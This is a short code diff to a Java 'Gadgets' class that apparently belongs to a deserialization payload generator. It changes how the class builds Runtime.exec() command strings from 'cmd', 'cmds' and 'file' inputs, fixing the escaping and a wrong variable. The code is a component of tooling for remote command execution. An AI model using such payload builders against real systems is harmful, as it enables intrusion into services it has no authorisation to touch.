@@ -127,30 +127,30 @@ public class Gadgets {
         StringBuilder final_java_code = new StringBuilder();
 
         if (payload_list.length == 1) {
-            final_java_code = new StringBuilder("java.lang.Runtime.getRuntime().exec(\"" +
-                payload_list[0].replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") +
-                "\");");
+            final_java_code.append("java.lang.Runtime.getRuntime().exec(\"");
+            final_java_code.append(payload_list[0].replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\\\""));
+            final_java_code.append("\");");
         } else {
             String protocol = payload_list[0];
             String payload = payload_list[1];
             switch (protocol.toLowerCase()) {
                 case "file":
-                    final_java_code = new StringBuilder(new String(Files.readAllBytes(Paths.get(payload))));
+                    final_java_code.append(new String(Files.readAllBytes(Paths.get(payload))));
                     break;
                 case "cmd":
-                    final_java_code = new StringBuilder("java.lang.Runtime.getRuntime().exec(\"" +
-                        payload_list[0].replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") +
-                        "\");");
+                    final_java_code.append("java.lang.Runtime.getRuntime().exec(\"");
+                    final_java_code.append(payload.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\\\""));
+                    final_java_code.append("\");");
                     break;
                 case "cmds":
                     JsonParser parser = new JsonParser();
                     JsonElement elements = parser.parse(payload);
                     if (elements.isJsonArray()) {
-                        final_java_code = new StringBuilder("java.lang.Runtime.getRuntime().exec(new String[]{");
+                        final_java_code.append("java.lang.Runtime.getRuntime().exec(new String[]{");
                         for (JsonElement element : elements.getAsJsonArray()) {
                             final_java_code.append("\"");
                             //System.out.println(element.getAsString());
-                            final_java_code.append(element.getAsString().replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\""));
+                            final_java_code.append(element.getAsString().replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\\\""));
                             final_java_code.append("\",");
                         }
                         final_java_code.deleteCharAt(final_java_code.length() - 1);
